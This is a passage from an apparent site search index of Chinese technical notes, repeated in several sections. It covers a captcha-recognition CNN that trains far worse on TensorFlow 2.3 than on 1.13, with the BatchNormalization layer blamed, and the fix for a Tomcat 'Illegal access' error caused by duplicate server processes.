13, 23, 128) 147584 _________________________________________________________________ batch_normalization_v1_2 (Ba (None, 13, 23, 128) 512 _________________________________________________________________ max_pooling2d_2 (MaxPooling2 (None, 6, 11, 128) 0 _________________________________________________________________ conv2d_6 (Conv2D) (None, 4, 9, 256) 295168 _________________________________________________________________ conv2d_7 (Conv2D) (None, 2, 7, 256) 590080 _________________________________________________________________ batch_normalization_v1_3 (Ba (None, 2, 7, 256) 1024 _________________________________________________________________ max_pooling2d_3 (MaxPooling2 (None, 1, 3, 256) 0 _________________________________________________________________ flatten (Flatten) (None, 768) 0 _________________________________________________________________ dropout (Dropout) (None, 768) 0 _________________________________________________________________ dense (Dense) (None, 248) 190712 _________________________________________________________________ reshape (Reshape) (None, 4, 62) 0 ================================================================= Total params: 1,364,312 Trainable params: 1,363,352 Non-trainable params: 960 _________________________________________________________________ \u6784\u5efa\u6a21\u578b\u7684\u4ee3\u7801\u3002 def captcha_model(): input_tensor = Input((height, width, channel)) x = input_tensor for i in range(4): x = Conv2D(32*2**i, (3,3) ,activation='relu', data_format = 'channels_last')(x) x = Conv2D(32*2**i, (3,3) ,activation='relu', data_format = 'channels_last')(x) x = BatchNormalization(axis = -1)(x) x = MaxPooling2D( (2, 2), data_format = 'channels_last')(x) x = Flatten()(x) x = Dropout(0.7)(x) x = Dense(n_len * n_class,activation = 'softmax')(x) x = Reshape([n_len , n_class])(x) model = Model(inputs = (input_tensor), outputs = x) return model model = captcha_model() model.compile(loss='categorical_crossentropy',optimizer='adadelta',metrics=['accuracy']) log = model.fit(gen(trainDir), steps_per_epoch=125, epochs=50, workers=1, validation_data=gen(valDir), validation_steps=30, callbacks=callbacks, shuffle=False, initial_epoch=0) TensorFlow2.3 \u7684 log \u3002 epoch,accuracy,loss,val_accuracy,val_loss 0,0.015124999918043613,8.563679695129395,0.01588541641831398,4.2869744300842285 1,0.01668749935925007,8.47919750213623,0.02031249925494194,4.490324020385742 2,0.014875000342726707,8.407829284667969,0.01875000074505806,4.638314247131348 3,0.015312500298023224,8.317134857177734,0.01875000074505806,4.755492687225342 4,0.016374999657273293,8.158424377441406,0.01640624925494194,4.840750217437744 5,0.017625000327825546,8.092458724975586,0.01822916604578495,5.16778564453125 6,0.016062499955296516,8.025052070617676,0.01927083358168602,5.403683185577393 7,0.01924999989569187,7.923693656921387,0.01848958246409893,5.478787899017334 8,0.017249999567866325,7.8893632888793945,0.01796874962747097,5.470637321472168 9,0.018187500536441803,7.766856670379639,0.01640624925494194,5.435889720916748 10,0.015687499195337296,7.725063323974609,0.01796874962747097,5.396360397338867 11,0.017374999821186066,7.6679534912109375,0.01848958246409893,5.356987476348877 12,0.018437499180436134,7.564635753631592,0.01848958246409893,5.319505214691162 13,0.017625000327825546,7.515840530395508,0.01692708395421505,5.276818752288818 14,0.017812499776482582,7.390673637390137,0.01770833320915699,5.235841751098633 15,0.015937499701976776,7.373181343078613,0.01666666753590107,5.200058937072754 16,0.017000000923871994,7.2762250900268555,0.01640624925494194,5.161618709564209 17,0.01693749986588955,7.20680046081543,0.01588541641831398,5.12495231628418 18,0.018124999478459358,7.1355390548706055,0.01666666753590107,5.095307350158691 19,0.017000000923871994,7.079192161560059,0.01640624925494194,5.062613487243652 20,0.020375000312924385,7.007359981536865,0.01640624925494194,5.035354137420654 21,0.017124999314546585,6.972399711608887,0.01666666753590107,5.006525993347168 22,0.02031249925494194,6.923651218414307,0.01692708395421505,4.98254919052124 23,0.017937500029802322,6.880887508392334,0.01718750037252903,4.952263355255127 24,0.019874999299645424,6.814514636993408,0.01718750037252903,4.927443981170654 25,0.017625000327825546,6.816472053527832,0.01718750037252903,4.906290054321289 26,0.017500000074505806,6.758553504943848,0.01614583283662796,4.8787150382995605 27,0.02031249925494194,6.677739143371582,0.01718750037252903,4.855156898498535 28,0.01875000074505806,6.657727241516113,0.01718750037252903,4.835511684417725 29,0.018812499940395355,6.64086389541626,0.01692708395421505,4.814121723175049 30,0.017625000327825546,6.576359272003174,0.01692708395421505,4.791886806488037 TensorFlow1.13 \u7684 log \u3002 epoch,acc,loss,val_acc,val_loss 0,0.0255625,5.077181438446045,0.018489582,4.2680645942687985 1,0.07375,4.232825519561768,0.021614583,4.310072708129883 2,0.189125,3.3906055221557616,0.09348958,3.697092080116272 3,0.3220625,2.782533073425293,0.3734375,2.67845033009847 4,0.4459375,2.2324572772979736,0.54010415,2.03217138449351 5,0.556875,1.7689155778884889,0.6799479,1.4857364217440288 6,0.627625,1.4569332599639893,0.70182294,1.284301801522573 7,0.6884375,1.1837729458808899,0.7653646,0.9562915066878 8,0.7413125,0.9627125940322876,0.8127604,0.7591553310553233 9,0.7959375,0.7573423423767089,0.83229166,0.6807228187719981 10,0.825875,0.6350686495304108,0.8546875,0.5848873257637024 11,0.853,0.5289459655284882,0.88411456,0.4935603012641271 12,0.884875,0.423498391866684,0.89765626,0.4287114977836609 13,0.8994375,0.36352477538585665,0.90260416,0.38502170890569687 14,0.9164375,0.29950085139274596,0.91197914,0.3697542185584704 15,0.9298125,0.2621841303110123,0.9252604,0.3068610819677512 16,0.9365,0.22799357956647873,0.9278646,0.29371654242277145 17,0.9459375,0.20434909224510192,0.9328125,0.26822425176699954 18,0.9556875,0.1652733843922615,0.93671876,0.24204065936307112 19,0.9613125,0.14448723024129867,0.94427085,0.22956395708024502 20,0.96525,0.13079090192914009,0.9427083,0.24467742964625358 21,0.9688125,0.1233107333779335,0.953125,0.2123609036207199 22,0.97225,0.10828567123413085,0.95234376,0.18939945536355177 23,0.9753125,0.09439545741677284,0.94635415,0.21550938238700232 24,0.978,0.08019113063812255,0.9427083,0.23453998242815335 25,0.9799375,0.07622397544980049,0.95416665,0.18319092725093167 26,0.981875,0.07041979816555977,0.95520836,0.18539929799735547 27,0.981625,0.06994605718553067,0.9557292,0.1825941739603877 28,0.9823125,0.06756504848599434,0.9578125,0.17843913696706296 29,0.9873125,0.05395500122010708,0.95390624,0.17013602449248236 30,0.987625,0.053968257874250414,0.9505208,0.1960703587780396 3. \u9519\u8bef\u6392\u67e5 # \u6211\u5728\u77e5\u4e4e\u4e0a\u8fdb\u884c\u4e86 \u63d0\u95ee \uff0c\u591a\u6570\u7a0b\u5e8f\u5458\u670b\u53cb\u8ba4\u4e3a\u662f BatchNormalization \u5c42\u9664\u4e86\u95ee\u9898\u3002 \u6211\u628a\u6a21\u578b\u4e2d\u7684 BN \u5c42\u53bb\u9664\u4ee5\u540e\uff0c\u53d1\u73b0 1.13 \u548c 2.3 \u7684\u6548\u679c\u57fa\u672c\u76f8\u540c\u4e86\uff0c\u901a\u8fc7\u5b9e\u9a8c\u4e5f\u6392\u9664\u4e86\u7531 Python \u7248\u672c\u3001\u6a21\u578b\u53c2\u6570\u7b49\u539f\u56e0\u5bfc\u81f4\u95ee\u9898\u7684\u5acc\u7591\u3002 \u57fa\u672c\u4e0a\u53ef\u4ee5\u786e\u5b9a\u662f TensorFlow2.3 \u4e2d\u7684 BN \u5c42\u51fa\u73b0\u4e86\u4e00\u4e9b\u95ee\u9898\uff0c\u5bfc\u81f4\u6a21\u578b\u6548\u679c\u8f83\u5dee\u3002 4. \u89e3\u51b3\u65b9\u6848 # TensorFlow2.3 \u4e2d\u53ef\u80fd\u4e5f\u5b58\u5728\u8bb8\u591a\u95ee\u9898\uff0c\u5728 Github \u4e0a\u8fd8\u6709 3.8K \u4e2a\u672a\u89e3\u51b3\u7684 Issues \uff0c\u6240\u4ee5\u5728\u6a21\u578b\u4e2d\u9700\u8981\u4f7f\u7528 BatchNormalization \u5c42\u65f6\uff0c\u5c3d\u91cf\u9009\u62e9 TensorFlow 1.x \u7248\u672c\u3002 \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"2.BN\u5c42\u5bfc\u81f4TensorFlow2.3\u6a21\u578b\u8bad\u7ec3\u6548\u679c\u8f83\u5dee"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/TensorFlow/TroubleShoot/2.BN%E5%B1%82%E5%AF%BC%E8%87%B4TensorFlow2.3%E6%A8%A1%E5%9E%8B%E8%AE%AD%E7%BB%83%E6%95%88%E6%9E%9C%E8%BE%83%E5%B7%AE/#bntensorflow23","text":"","title":"BN\u5c42\u5bfc\u81f4TensorFlow2.3\u6a21\u578b\u8bad\u7ec3\u6548\u679c\u8f83\u5dee"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/TensorFlow/TroubleShoot/2.BN%E5%B1%82%E5%AF%BC%E8%87%B4TensorFlow2.3%E6%A8%A1%E5%9E%8B%E8%AE%AD%E7%BB%83%E6%95%88%E6%9E%9C%E8%BE%83%E5%B7%AE/#_1","text":"[toc]","title":"\u76ee\u5f55"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/TensorFlow/TroubleShoot/2.BN%E5%B1%82%E5%AF%BC%E8%87%B4TensorFlow2.3%E6%A8%A1%E5%9E%8B%E8%AE%AD%E7%BB%83%E6%95%88%E6%9E%9C%E8%BE%83%E5%B7%AE/#1","text":"\u6700\u8fd1\u6211\u628aTensorFlow\u4ece 1.13 \u5347\u7ea7\u5230\u4e86 2.3 \u7248\u672c\uff0c\u7528\u6765\u8dd1\u4e4b\u524d\u7684\u4e00\u4e2a\u9a8c\u8bc1\u7801\u8bc6\u522b\u7684\u9879\u76ee\u65f6\uff0c\u53d1\u73b0 1.13 \u51c6\u786e\u7387 95% \u4ee5\u4e0a\uff0c 2.3 \u53ea\u6709 1% \u3002 \u5b8c\u6574\u4ee3\u7801\u8bf7\u53c2\u8003 Github \u3002","title":"1. \u80cc\u666f"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/TensorFlow/TroubleShoot/2.BN%E5%B1%82%E5%AF%BC%E8%87%B4TensorFlow2.3%E6%A8%A1%E5%9E%8B%E8%AE%AD%E7%BB%83%E6%95%88%E6%9E%9C%E8%BE%83%E5%B7%AE/#2","text":"\u6a21\u578b\u7ed3\u6784\u5982\u4e0b\u3002 _________________________________________________________________ Layer (type) Output Shape Param # ================================================================= input_1 (InputLayer) (None, 80, 120, 1) 0 _________________________________________________________________ conv2d (Conv2D) (None, 78, 118, 32) 320 _________________________________________________________________ conv2d_1 (Conv2D) (None, 76, 116, 32) 9248 _________________________________________________________________ batch_normalization_v1 (Batc (None, 76, 116, 32) 128 _________________________________________________________________ max_pooling2d (MaxPooling2D) (None, 38, 58, 32) 0 _________________________________________________________________ conv2d_2 (Conv2D) (None, 36, 56, 64) 18496 _________________________________________________________________ conv2d_3 (Conv2D) (None, 34, 54, 64) 36928 _________________________________________________________________ batch_normalization_v1_1 (Ba (None, 34, 54, 64) 256 _________________________________________________________________ max_pooling2d_1 (MaxPooling2 (None, 17, 27, 64) 0 _________________________________________________________________ conv2d_4 (Conv2D) (None, 15, 25, 128) 73856 _________________________________________________________________ conv2d_5 (Conv2D) (None, 13, 23, 128) 147584 _________________________________________________________________ batch_normalization_v1_2 (Ba (None, 13, 23, 128) 512 _________________________________________________________________ max_pooling2d_2 (MaxPooling2 (None, 6, 11, 128) 0 _________________________________________________________________ conv2d_6 (Conv2D) (None, 4, 9, 256) 295168 _________________________________________________________________ conv2d_7 (Conv2D) (None, 2, 7, 256) 590080 _________________________________________________________________ batch_normalization_v1_3 (Ba (None, 2, 7, 256) 1024 _________________________________________________________________ max_pooling2d_3 (MaxPooling2 (None, 1, 3, 256) 0 _________________________________________________________________ flatten (Flatten) (None, 768) 0 _________________________________________________________________ dropout (Dropout) (None, 768) 0 _________________________________________________________________ dense (Dense) (None, 248) 190712 _________________________________________________________________ reshape (Reshape) (None, 4, 62) 0 ================================================================= Total params: 1,364,312 Trainable params: 1,363,352 Non-trainable params: 960 _________________________________________________________________ \u6784\u5efa\u6a21\u578b\u7684\u4ee3\u7801\u3002 def captcha_model(): input_tensor = Input((height, width, channel)) x = input_tensor for i in range(4): x = Conv2D(32*2**i, (3,3) ,activation='relu', data_format = 'channels_last')(x) x = Conv2D(32*2**i, (3,3) ,activation='relu', data_format = 'channels_last')(x) x = BatchNormalization(axis = -1)(x) x = MaxPooling2D( (2, 2), data_format = 'channels_last')(x) x = Flatten()(x) x = Dropout(0.7)(x) x = Dense(n_len * n_class,activation = 'softmax')(x) x = Reshape([n_len , n_class])(x) model = Model(inputs = (input_tensor), outputs = x) return model model = captcha_model() model.compile(loss='categorical_crossentropy',optimizer='adadelta',metrics=['accuracy']) log = model.fit(gen(trainDir), steps_per_epoch=125, epochs=50, workers=1, validation_data=gen(valDir), validation_steps=30, callbacks=callbacks, shuffle=False, initial_epoch=0) TensorFlow2.3 \u7684 log \u3002 epoch,accuracy,loss,val_accuracy,val_loss 0,0.015124999918043613,8.563679695129395,0.01588541641831398,4.2869744300842285 1,0.01668749935925007,8.47919750213623,0.02031249925494194,4.490324020385742 2,0.014875000342726707,8.407829284667969,0.01875000074505806,4.638314247131348 3,0.015312500298023224,8.317134857177734,0.01875000074505806,4.755492687225342 4,0.016374999657273293,8.158424377441406,0.01640624925494194,4.840750217437744 5,0.017625000327825546,8.092458724975586,0.01822916604578495,5.16778564453125 6,0.016062499955296516,8.025052070617676,0.01927083358168602,5.403683185577393 7,0.01924999989569187,7.923693656921387,0.01848958246409893,5.478787899017334 8,0.017249999567866325,7.8893632888793945,0.01796874962747097,5.470637321472168 9,0.018187500536441803,7.766856670379639,0.01640624925494194,5.435889720916748 10,0.015687499195337296,7.725063323974609,0.01796874962747097,5.396360397338867 11,0.017374999821186066,7.6679534912109375,0.01848958246409893,5.356987476348877 12,0.018437499180436134,7.564635753631592,0.01848958246409893,5.319505214691162 13,0.017625000327825546,7.515840530395508,0.01692708395421505,5.276818752288818 14,0.017812499776482582,7.390673637390137,0.01770833320915699,5.235841751098633 15,0.015937499701976776,7.373181343078613,0.01666666753590107,5.200058937072754 16,0.017000000923871994,7.2762250900268555,0.01640624925494194,5.161618709564209 17,0.01693749986588955,7.20680046081543,0.01588541641831398,5.12495231628418 18,0.018124999478459358,7.1355390548706055,0.01666666753590107,5.095307350158691 19,0.017000000923871994,7.079192161560059,0.01640624925494194,5.062613487243652 20,0.020375000312924385,7.007359981536865,0.01640624925494194,5.035354137420654 21,0.017124999314546585,6.972399711608887,0.01666666753590107,5.006525993347168 22,0.02031249925494194,6.923651218414307,0.01692708395421505,4.98254919052124 23,0.017937500029802322,6.880887508392334,0.01718750037252903,4.952263355255127 24,0.019874999299645424,6.814514636993408,0.01718750037252903,4.927443981170654 25,0.017625000327825546,6.816472053527832,0.01718750037252903,4.906290054321289 26,0.017500000074505806,6.758553504943848,0.01614583283662796,4.8787150382995605 27,0.02031249925494194,6.677739143371582,0.01718750037252903,4.855156898498535 28,0.01875000074505806,6.657727241516113,0.01718750037252903,4.835511684417725 29,0.018812499940395355,6.64086389541626,0.01692708395421505,4.814121723175049 30,0.017625000327825546,6.576359272003174,0.01692708395421505,4.791886806488037 TensorFlow1.13 \u7684 log \u3002 epoch,acc,loss,val_acc,val_loss 0,0.0255625,5.077181438446045,0.018489582,4.2680645942687985 1,0.07375,4.232825519561768,0.021614583,4.310072708129883 2,0.189125,3.3906055221557616,0.09348958,3.697092080116272 3,0.3220625,2.782533073425293,0.3734375,2.67845033009847 4,0.4459375,2.2324572772979736,0.54010415,2.03217138449351 5,0.556875,1.7689155778884889,0.6799479,1.4857364217440288 6,0.627625,1.4569332599639893,0.70182294,1.284301801522573 7,0.6884375,1.1837729458808899,0.7653646,0.9562915066878 8,0.7413125,0.9627125940322876,0.8127604,0.7591553310553233 9,0.7959375,0.7573423423767089,0.83229166,0.6807228187719981 10,0.825875,0.6350686495304108,0.8546875,0.5848873257637024 11,0.853,0.5289459655284882,0.88411456,0.4935603012641271 12,0.884875,0.423498391866684,0.89765626,0.4287114977836609 13,0.8994375,0.36352477538585665,0.90260416,0.38502170890569687 14,0.9164375,0.29950085139274596,0.91197914,0.3697542185584704 15,0.9298125,0.2621841303110123,0.9252604,0.3068610819677512 16,0.9365,0.22799357956647873,0.9278646,0.29371654242277145 17,0.9459375,0.20434909224510192,0.9328125,0.26822425176699954 18,0.9556875,0.1652733843922615,0.93671876,0.24204065936307112 19,0.9613125,0.14448723024129867,0.94427085,0.22956395708024502 20,0.96525,0.13079090192914009,0.9427083,0.24467742964625358 21,0.9688125,0.1233107333779335,0.953125,0.2123609036207199 22,0.97225,0.10828567123413085,0.95234376,0.18939945536355177 23,0.9753125,0.09439545741677284,0.94635415,0.21550938238700232 24,0.978,0.08019113063812255,0.9427083,0.23453998242815335 25,0.9799375,0.07622397544980049,0.95416665,0.18319092725093167 26,0.981875,0.07041979816555977,0.95520836,0.18539929799735547 27,0.981625,0.06994605718553067,0.9557292,0.1825941739603877 28,0.9823125,0.06756504848599434,0.9578125,0.17843913696706296 29,0.9873125,0.05395500122010708,0.95390624,0.17013602449248236 30,0.987625,0.053968257874250414,0.9505208,0.1960703587780396","title":"2. \u6a21\u578b"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/TensorFlow/TroubleShoot/2.BN%E5%B1%82%E5%AF%BC%E8%87%B4TensorFlow2.3%E6%A8%A1%E5%9E%8B%E8%AE%AD%E7%BB%83%E6%95%88%E6%9E%9C%E8%BE%83%E5%B7%AE/#3","text":"\u6211\u5728\u77e5\u4e4e\u4e0a\u8fdb\u884c\u4e86 \u63d0\u95ee \uff0c\u591a\u6570\u7a0b\u5e8f\u5458\u670b\u53cb\u8ba4\u4e3a\u662f BatchNormalization \u5c42\u9664\u4e86\u95ee\u9898\u3002 \u6211\u628a\u6a21\u578b\u4e2d\u7684 BN \u5c42\u53bb\u9664\u4ee5\u540e\uff0c\u53d1\u73b0 1.13 \u548c 2.3 \u7684\u6548\u679c\u57fa\u672c\u76f8\u540c\u4e86\uff0c\u901a\u8fc7\u5b9e\u9a8c\u4e5f\u6392\u9664\u4e86\u7531 Python \u7248\u672c\u3001\u6a21\u578b\u53c2\u6570\u7b49\u539f\u56e0\u5bfc\u81f4\u95ee\u9898\u7684\u5acc\u7591\u3002 \u57fa\u672c\u4e0a\u53ef\u4ee5\u786e\u5b9a\u662f TensorFlow2.3 \u4e2d\u7684 BN \u5c42\u51fa\u73b0\u4e86\u4e00\u4e9b\u95ee\u9898\uff0c\u5bfc\u81f4\u6a21\u578b\u6548\u679c\u8f83\u5dee\u3002","title":"3. \u9519\u8bef\u6392\u67e5"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/TensorFlow/TroubleShoot/2.BN%E5%B1%82%E5%AF%BC%E8%87%B4TensorFlow2.3%E6%A8%A1%E5%9E%8B%E8%AE%AD%E7%BB%83%E6%95%88%E6%9E%9C%E8%BE%83%E5%B7%AE/#4","text":"TensorFlow2.3 \u4e2d\u53ef\u80fd\u4e5f\u5b58\u5728\u8bb8\u591a\u95ee\u9898\uff0c\u5728 Github \u4e0a\u8fd8\u6709 3.8K \u4e2a\u672a\u89e3\u51b3\u7684 Issues \uff0c\u6240\u4ee5\u5728\u6a21\u578b\u4e2d\u9700\u8981\u4f7f\u7528 BatchNormalization \u5c42\u65f6\uff0c\u5c3d\u91cf\u9009\u62e9 TensorFlow 1.x \u7248\u672c\u3002 \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"4. \u89e3\u51b3\u65b9\u6848"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Tomcat/TroubleShoot/1.Illegal_Access/","text":"Tomcat \u62a5\u9519 Illegal access # \u76ee\u5f55 # [toc] 1. \u80cc\u666f # \u6211\u5c1d\u8bd5\u4f7f\u7528 scp \u76f4\u63a5\u5411\u8fdc\u7a0bTomcat\u670d\u52a1\u5668\u8def\u5f84\u4f20\u8f93 war \u5305\uff0c scp -r ./target/courseDesign.war root@x x.xx.xx.xx:/usr/local/tomcat/webapps \u4f20\u8f93\u5b8c\u4ee5\u540e\uff0c\u53d1\u73b0\u6240\u6709\u53d1\u9001\u8fc7\u53bb\u7684\u8bf7\u6c42\u90fd\u65e0\u54cd\u5e94\uff0c\u5728\u65e5\u5fd7\u4e2d\u67e5\u5230\u4ee5\u4e0b\u4fe1\u606f\u3002 07-Sep-2020 15:31:19.633 INFO [C3P0PooledConnectionPoolManager[identityToken->1bqqnffacsmkhtl17op5zq|1ac4152d]-HelperThread-#2] org.apache.catalina.loader.WebappClassLoaderBase.checkStateForResourceLoading Illegal access: this web application instance has been stopped already. Could not load [com.mysql.jdbc.SQLError]. The following stack trace is thrown for debugging purposes as well as to attempt to terminate the thread which caused the illegal access. java.lang.IllegalStateException: Illegal access: this web application instance has been stopped already. Could not load [com.mysql.jdbc.SQLError]. The following stack trace is thrown for debugging purposes as well as to attempt to terminate the thread which caused the illegal access. at org.apache.catalina.loader.WebappClassLoaderBase.checkStateForResourceLoading(WebappClassLoaderBase.java:1385) at org.apache.catalina.loader.WebappClassLoaderBase.checkStateForClassLoading(WebappClassLoaderBase.java:1373) at org.apache.catalina.loader.WebappClassLoaderBase.loadClass(WebappClassLoaderBase.java:1226) at org.apache.catalina.loader.WebappClassLoaderBase.loadClass(WebappClassLoaderBase.java:1188) at com.mysql.jdbc.MysqlIO.reuseAndReadPacket(MysqlIO.java:3562) at com.mysql.jdbc.MysqlIO.reuseAndReadPacket(MysqlIO.java:3462) at com.mysql.jdbc.MysqlIO.checkErrorPacket(MysqlIO.java:3905) at com.mysql.jdbc.MysqlIO.checkErrorPacket(MysqlIO.java:871) at com.mysql.jdbc.MysqlIO.proceedHandshakeWithPluggableAuthentication(MysqlIO.java:1714) at com.mysql.jdbc.MysqlIO.doHandshake(MysqlIO.java:1224) at com.mysql.jdbc.ConnectionImpl.coreConnect(ConnectionImpl.java:2199) at com.mysql.jdbc.ConnectionImpl.connectOneTryOnly(ConnectionImpl.java:2230) at com.mysql.jdbc.ConnectionImpl.createNewIO(ConnectionImpl.java:2025) at com.mysql.jdbc.ConnectionImpl.<init>(ConnectionImpl.java:778) at com.mysql.jdbc.JDBC4Connection.<init>(JDBC4Connection.java:47) at sun.reflect.GeneratedConstructorAccessor114.newInstance(Unknown Source) at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45) at java.lang.reflect.Constructor.newInstance(Constructor.java:423) at com.mysql.jdbc.Util.handleNewInstance(Util.java:425) at com.mysql.jdbc.ConnectionImpl.getInstance(ConnectionImpl.java:386) at com.mysql.jdbc.NonRegisteringDriver.connect(NonRegisteringDriver.java:330) at com.mchange.v2.c3p0.DriverManagerDataSource.getConnection(DriverManagerDataSource.java:175) at com.mchange.v2.c3p0.WrapperConnectionPoolDataSource.getPooledConnection(WrapperConnectionPoolDataSource.java:220) at com.mchange.v2.c3p0.WrapperConnectionPoolDataSource.getPooledConnection(WrapperConnectionPoolDataSource.java:206) at com.mchange.v2.c3p0.impl.C3P0PooledConnectionPool$1PooledConnectionResourcePoolManager.acquireResource(C3P0PooledConnectionPool.java:203) at com.mchange.v2.resourcepool.BasicResourcePool.doAcquire(BasicResourcePool.java:1138) at com.mchange.v2.resourcepool.BasicResourcePool.doAcquireAndDecrementPendingAcquiresWithinLockOnSuccess(BasicResourcePool.java:1125) at com.mchange.v2.resourcepool.BasicResourcePool.access$700(BasicResourcePool.java:44) at com.mchange.v2.resourcepool.BasicResourcePool$ScatteredAcquireTask.run(BasicResourcePool.java:1870) at com.mchange.v2.async.ThreadPoolAsynchronousRunner$PoolThread.run(ThreadPoolAsynchronousRunner.java:696) \u641c\u7d22\u4e86\u4e00\u4e9b\u7ed3\u5c40\u65b9\u6848\u4ee5\u540e\uff0c\u53d1\u73b0\u662fTomcat\u542f\u52a8\u4e86\u4e24\u4e2a\u670d\u52a1\u5bfc\u81f4\u7684\u62a5\u9519\u3002 2. \u89e3\u51b3\u65b9\u6848 # \u9996\u5148\u627e\u51faTomcat\u7684\u8fdb\u7a0b ps -ef |grep tomcat root 13527 1 3 16:13 pts/1 00:00:03 /usr/local/jdk1.8.0_211/jre/bin/java -Djava.util.logging.config.file=/usr/local/myTomcat/tomcat/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /usr/local/myTomcat/tomcat/bin/bootstrap.jar:/usr/local/myTomcat/tomcat/bin/tomcat-juli.jar -Dcatalina.base=/usr/local/myTomcat/tomcat -Dcatalina.home=/usr/local/myTomcat/tomcat -Djava.io.tmpdir=/usr/local/myTomcat/tomcat/temp org.apache.catalina.startup.Bootstrap start root 13598 12422 0 16:15 pts/1 00:00:00 grep --color=auto --exclude-dir=.bzr --exclude-dir=CVS --exclude-dir=.git --exclude-dir=.hg --exclude-dir=.svn --exclude-dir=.idea --exclude-dir=.tox tomcat root 14985 1 0 Jun19 ? 03:25:17 /usr/local/jdk1.8.0_211/jre/bin/java -Djava.util.logging.config.file=/usr/local/myTomcat/tomcat/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /usr/local/myTomcat/tomcat/bin/bootstrap.jar:/usr/local/myTomcat/tomcat/bin/tomcat-juli.jar -Dcatalina.base=/usr/local/myTomcat/tomcat -Dcatalina.home=/usr/local/myTomcat/tomcat -Djava.io.tmpdir=/usr/local/myTomcat/tomcat/temp org.apache.catalina.startup.Bootstrap start \u679c\u7136\u6709\u4e24\u4e2a\u8fdb\u7a0b\u3002 \u6740\u6389\u4e24\u4e2a\u8fdb\u7a0b kill -9 13527 ; kill -9 14985 \u542f\u52a8Tomcat sh startup.sh \u5982\u679c\u8bbf\u95eeTomcat\u670d\u52a1\u663e\u793a404 Not Found\uff0c\u628a war \u5305\u91cd\u65b0\u4f20\u5230\u670d\u52a1\u5668\u8def\u5f84\u5373\u53ef\u3002 \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"1.Illegal Access"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Tomcat/TroubleShoot/1.Illegal_Access/#tomcat-illegal-access","text":"","title":"Tomcat \u62a5\u9519 Illegal access"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Tomcat/TroubleShoot/1.Illegal_Access/#_1","text":"[toc]","title":"\u76ee\u5f55"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Tomcat/TroubleShoot/1.Illegal_Access/#1","text":"\u6211\u5c1d\u8bd5\u4f7f\u7528 scp \u76f4\u63a5\u5411\u8fdc\u7a0bTomcat\u670d\u52a1\u5668\u8def\u5f84\u4f20\u8f93 war \u5305\uff0c scp -r ./target/courseDesign.war root@x x.xx.xx.xx:/usr/local/tomcat/webapps \u4f20\u8f93\u5b8c\u4ee5\u540e\uff0c\u53d1\u73b0\u6240\u6709\u53d1\u9001\u8fc7\u53bb\u7684\u8bf7\u6c42\u90fd\u65e0\u54cd\u5e94\uff0c\u5728\u65e5\u5fd7\u4e2d\u67e5\u5230\u4ee5\u4e0b\u4fe1\u606f\u3002 07-Sep-2020 15:31:19.633 INFO [C3P0PooledConnectionPoolManager[identityToken->1bqqnffacsmkhtl17op5zq|1ac4152d]-HelperThread-#2] org.apache.catalina.loader.WebappClassLoaderBase.checkStateForResourceLoading Illegal access: this web application instance has been stopped already. Could not load [com.mysql.jdbc.SQLError]. The following stack trace is thrown for debugging purposes as well as to attempt to terminate the thread which caused the illegal access. java.lang.IllegalStateException: Illegal access: this web application instance has been stopped already. Could not load [com.mysql.jdbc.SQLError]. The following stack trace is thrown for debugging purposes as well as to attempt to terminate the thread which caused the illegal access. at 